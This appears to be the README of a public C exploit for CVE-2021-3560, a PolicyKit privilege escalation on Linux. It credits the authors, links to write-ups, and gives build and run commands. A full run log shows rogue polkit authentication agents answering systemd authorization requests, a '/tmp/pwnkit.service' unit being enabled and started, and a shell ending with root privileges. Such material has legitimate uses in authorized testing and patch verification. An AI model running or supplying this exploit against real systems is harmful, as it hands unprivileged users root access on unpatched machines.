PolicyKit CVE-2021-3560 Exploitation (Authentication Agent)
====
C implementation of CVE-2021-3560 exploitation, blog posts about this exploitation: 
- https://ricterz.me/posts/2022-04-28-a-new-exploitation-way-for-cve-2021-3560-polkit-linux-privilege-escalation.txt
- http://noahblog.360.cn/a-new-exploitation-way-for-cve-2021-3560-policykit-linux-privilege-escalation

### Contributors
Code by swing (@WinMin), Ricter Z(@RicterZ)

### Usage
```
dev@server:/tmp/CVE-2021-3560$ make
dev@server:/tmp/CVE-2021-3560$ ./exploit
pid:43357 - [ polkit CVE-2021-3560 exploit ] - RicterZ @ 360 Noah Lab, C writed by Swing @ chaitin
pid:43357 - [*] starting polkit authentication agent ...
pid:43359 - [*] starting polkit authentication agent ...
pid:43358 - [*] starting polkit authentication agent ...
pid:43357 - [*] trying to register authentication agent to polkit ...
pid:43359 - [*] trying to register authentication agent to polkit ...
pid:43358 - [*] trying to register authentication agent to polkit ...
pid:43357 - [+] polkit authentication agent registered successfully!
pid:43357 - [+] D-Bus message loop now running ..
pid:43359 - [+] polkit authentication agent registered successfully!
pid:43359 - [+] D-Bus message loop now running ..
pid:43358 - [+] polkit authentication agent registered successfully!
pid:43358 - [+] D-Bus message loop now running ..
pid:43357 - [*] trying to reload systemd daemon ...
pid:43359 - [*] trying to enable system unit file '/tmp/pwnkit.service' ...
pid:43358 - [*] trying to start systemd service 'pwnkit.service' ...
pid:43357 - [+] received authentication for action 'org.freedesktop.systemd1.reload-daemon' ...
pid:43357 - [*] sending agent response with cookie: 37-03928d57269e64705cdf577c81091a40-1-7d320de4bf4daab67a580ec22963e75b
pid:43359 - [+] received authentication for action 'org.freedesktop.systemd1.manage-unit-files' ...
pid:43359 - [*] sending agent response with cookie: 38-f2fa7d31f2b927ee98756cfc68b4958e-1-bd79c18fc7abbecbbdcba811627041fe
pid:43358 - [+] received authentication for action 'org.freedesktop.systemd1.manage-units' ...
pid:43358 - [*] sending agent response with cookie: 39-d863124a17968acfa1e1adce6b1747bc-1-f9b8a33356cc696afa7e6ba8f4aa3e65
Killed
dev@server:/tmp/CVE-2021-3560$ pwned -p
pwned-5.0# id
uid=1000(dev) gid=1000(dev) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),1000(dev)
```
